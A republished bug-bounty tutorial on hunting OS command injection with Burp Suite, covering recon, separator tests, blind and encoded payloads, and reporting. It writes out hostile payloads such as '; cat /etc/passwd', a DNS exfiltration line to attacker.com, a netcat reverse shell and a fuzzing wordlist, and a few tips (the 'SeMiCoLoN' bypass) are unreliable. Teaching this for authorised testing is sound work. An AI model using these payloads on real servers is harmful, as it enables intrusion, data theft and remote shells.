# :game_die: Hunting OS Command Injection. Easily Find OS Command Injection Bugs…

> **Original Source:** [Hunting OS Command Injection. Easily Find OS Command Injection Bugs…](https://infosecwriteups.com/hunting-os-command-injection-039dbb284c7d)
> **Platform:** infosecwriteups.com | **Category:** `MISC`

---

# Hunting OS Command Injection


## Easily Find OS Command Injection Bugs with This Simple Burp Suite Method


OS command injection (also called OS command execution or shell injection) is a serious vulnerability where an attacker can inject malicious commands into a web app, potentially running them on the server’s operating system. This could lead to full server compromise, data theft, or even remote code execution. Finding it manually in Burp Suite is exciting for bug bounty hunters because it often pays big rewards (e.g., $1,000–$10,000 on HackerOne). But you need to be smart about it — don’t just fuzz randomly; start with indicators to see if the site is vulnerable.


## Get Monika sharma’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


In this guide, I’ll explain what I’d look for first on a target website to spot potential OS command injection risks, then walk you through manual steps in Burp Suite to test and exploit it. This is based on real-world bug bounty practices, like those from PortSwigger’s Web Security Academy and HackerOne reports. Remember, always test ethically in scope — use legal targets like labs or bug bounty programs. Let’s break it down step by step.

## Step 1: Initial Recon — What to Look for on the Website to Spot Potential OS Command Injection


Before firing up Burp Suite, I’d spend time understanding the site to identify features that could be vulnerable. OS command injection happens when user input (e.g., from forms or URLs) is passed unsanitized to system commands like `ping`, `ls`, or `cat` on the server. Not every site has this risk, so I'd focus on "clues" that suggest the app interacts with the OS. Here's what I'd check first:

## 1. Examine Input Fields and Features


- File Upload or Download Tools: Look for features like “Upload file” or “Download report” where the app might use OS commands to process files (e.g., `cat filename` or `rm file`). If the app shows file lists or processes uploads with system calls, it's a red flag.

- Network Tools: Check for ping, traceroute, or DNS lookup features. These often use OS commands like `ping -c 1 example.com` or `nslookup domain`. If you can input a domain and see results, test if it accepts commands.

- Image or Media Processing: Sites with photo uploads or image resizing might use tools like `convert` (ImageMagick) or `ffmpeg`, which can be injected (e.g., `convert image.jpg; ls /`).

- Search or Query Forms: Any search box that “searches files” or runs system queries (e.g., “Find file by name”) could pipe input to `find` or `grep` commands.

- How to Check: Browse the site manually. Use your browser’s Developer Tools (F12 > Network tab) to see if inputs are sent to endpoints like `/ping` or `/upload`. If the app mentions "system tools" or shows command-like outputs, it's promising.

## 2. Review the Tech Stack


- Server-Side Languages: Look for apps built with PHP, Node.js, Python, or Java, as they often use system calls (e.g., PHP’s `exec()` or Node's `child_process`). Use tools like Wappalyzer (browser extension) to detect the stack.

- Error Messages: Trigger errors (e.g., invalid input) and look for leaks like “Command not found” or “Permission denied,” which hint at OS interactions.

- Documentation or Source Code: If the site has public docs, APIs, or GitHub repos, search for keywords like `exec`, `system`, `shell_exec`, `popen`, or `Runtime.exec`. This shows if the app uses dangerous functions.

- How to Check: Use `whatweb` command-line tool:


```
whatweb https://example.com
```


- Or inspect the site’s HTML/JS for clues like `<form action="/ping">`

## 3. OSINT and Historical Clues


- Past Vulnerabilities: Search HackerOne or CVE databases for similar bugs in the site’s tech (e.g., “WordPress OS command injection”).

- Subdomains and Features: Check subdomains like `tools.example.com` or `admin.example.com` for utility features.

- How to Check: Use `waybackurls` for archived pages:


```
waybackurls example.com | grep "ping\|upload\|search"
```


- This might reveal old features with command-like inputs.


If I spot any of these (e.g., a ping tool or file processor), the site has a high chance of OS command injection. Now, let’s move to manual testing in Burp Suite.

## Step 2: Manual Testing in Burp Suite — Step-by-Step Guide


Once I identify a potential input point (e.g., a form or URL parameter), I’d switch to Burp Suite for controlled testing. Burp is perfect for manual OS command injection because it lets you intercept, modify, and repeat requests. Assume the target is `https://example.com/ping?host=example.com` (a common vulnerable endpoint). Here's how I'd test:

## Preparation in Burp Suite


- Set Up Burp as Proxy:


- Launch Burp Suite (Community Edition is free).

- Go to Proxy > Options and ensure it’s running on `127.0.0.1:8080`.

- Configure your browser (e.g., Chrome) to use this proxy: Settings > System > Open proxy settings > Manual proxy: `127.0.0.1:8080`.

- Install Burp’s CA certificate: In Burp, Proxy > Options > Import/Export CA Certificate > Export in DER format, then import to your browser.


2. Add Target to Scope:


- Go to Target > Scope.

- Click Add and include the domain (e.g., `[https://example.com](https://example.com).)`[).](https://example.com).)

- This filters traffic to in-scope items.


3. Turn On Intercept:


- In Proxy > Intercept, toggle “Intercept is on” to capture requests.

## Step 3: Capture and Intercept the Request


- Browse the Site:


2. Inspect the Request:


- In the Intercept tab, you’ll see something like:


```
GET /ping?host=example.com HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
```


- Forward the request (Action > Forward) to see the response (e.g., ping results).


3. Send to Repeater:


- Right-click the request > Send to Repeater.

- This lets you modify and resend without re-browsing.

## Step 4: Test for OS Command Injection Manually


In Repeater, modify the input (e.g., the `host` parameter) to inject commands. Start simple and escalate.


- Basic Injection Test:


- Change the parameter to include a command separator (e.g., `; ls` for Linux or `&& dir` for Windows):


```
GET /ping?host=example.com; ls HTTP/1.1
Host: example.com
```


- Send the request. If the response includes file listings (e.g., “dir1 dir2”), it’s vulnerable! The app is executing `ping example.com; ls`.


2. Test Different Separators:


- Try common OS separators:

- Linux/Unix: `;`, `&&`, `||`, `|`, ``` (backtick), `$()` (subshell).

- Windows: `&`, `&&`, `||`, `%COMSPEC% /c`.

- Example:


```
GET /ping?host=example.com && whoami HTTP/1.1
```


- Response with “www-data” or “nt authority\system” confirms injection.


3. Blind Injection (No Output):


- If no output shows, test blind commands (e.g., time delays or DNS lookups).

- Time-based: `; sleep 5` – if the response delays 5 seconds, it's vulnerable.


```
GET /ping?host=example.com; sleep 5 HTTP/1.1
```


- DNS-based: `; nslookup $(whoami).attacker.com` – check your DNS logs for queries.

- Use Burp’s Repeater to time responses (note the time before/after sending).


4. Escalate to Read Files:


- If basic injection works, read sensitive files:

- Linux: `; cat /etc/passwd` or `; cat /var/www/config.php`.

- Windows: `&& type C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts`.


```
GET /ping?host=example.com; cat /etc/passwd HTTP/1.1
```


- Look for user lists or credentials in the response.


5. Test Encodings and Filters:


- If separators are filtered, encode them:

- URL encode: `%3b` for `;`, `%26%26` for `&&`.

- Example:


```
GET /ping?host=example.com%3b ls HTTP/1.1
```


- Use comments to truncate: `; ls #` (ignores after #).


6. Add Headers or Methods:


- Change method to POST with body input:


```
POST /ping HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
host=example.com; ls
```


- Add headers like `X-Forwarded-For: example.com; ls`.

## Step 5: Confirm and Exploit the Vulnerability


- Verify with PoC:


- If `; ls` works, try reading a known file: `; cat /proc/version` to confirm OS.

- Document in Burp: Take screenshots of request/response in Repeater.


2. Escalate if Possible:


- Write a file: `; echo "hacked" > /tmp/test.txt`.

- Reverse shell: `; nc -e /bin/sh attacker.com 4444` (set up a listener with `nc -lvnp 4444`).


3. Check for WAF Bypass:


- If blocked, slow down requests or use case variations (e.g., `SeMiCoLoN` for `;`).

## Step 6: Report the Bug


- Craft a Report:


- Title: OS Command Injection in Ping Feature Leading to RCE

- Description: Input in `/ping?host` is unsanitized, allowing command execution.

- PoC: Response: File listing.


```
GET /ping?host=example.com; ls HTTP/1.1
```


- Impact: Full server compromise, data theft.

- Submit to HackerOne/Bugcrowd.


2. Example Reward: $2,000 for a similar ping injection on a real program.

## Real-World Example: A $3,000 Bug


In a HackerOne report, a hunter found OS command injection in a file search tool:


- Input: `search?file=test.jpg; cat /etc/passwd`.

- Response: User list leaked.

- Bounty: $3,000 for RCE risk.

## Pro Tips


- Start Simple: Test `; id` or `&& whoami` first.

- OS Detection: Use `; uname -a` to identify Linux/Windows.

- Combine Tools: Use ffuf for initial fuzzing:


```
ffuf -u "https://example.com/ping?host=FUZZ" -w command_injection_wordlist.txt
```


- Stay Ethical: Only test in-scope sites; practice on DVWA or PortSwigger labs.

- Wordlist for Fuzzing: Use this simple one for commands:


```
; ls
&& dir
| whoami
; cat /etc/passwd
&& type C:\Windows\system.ini
; sleep 5
```


- Common Vulnerable Features: Ping tools, file managers, image processors.

## Common Mistakes to Avoid


- No Scope Check: Always verify the feature is in scope.

- Overlooking Blind Injection: Test time delays if no output shows.

- Poor PoC: Include exact request/response in reports.

- Ignoring Filters: Encode inputs if basic tests fail.

## Why This Method Works


Manual testing in Burp Suite gives control over requests, helping you spot subtle injections that automated tools miss. By starting with site recon and escalating from basic to advanced tests, you can confirm OS command injection reliably.

## Conclusion


Finding OS command injection starts with spotting OS-interacting features like ping tools or file uploads, then manually testing in Burp Suite with separators, encodings, and escalations. Practice on safe labs, use the tips above, and report ethically for rewards. Your next RCE bug could be a game-changer — happy hunting!

---

*Originally published on [Medium](https://infosecwriteups.com/hunting-os-command-injection-039dbb284c7d). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of misc CTF writeups.*
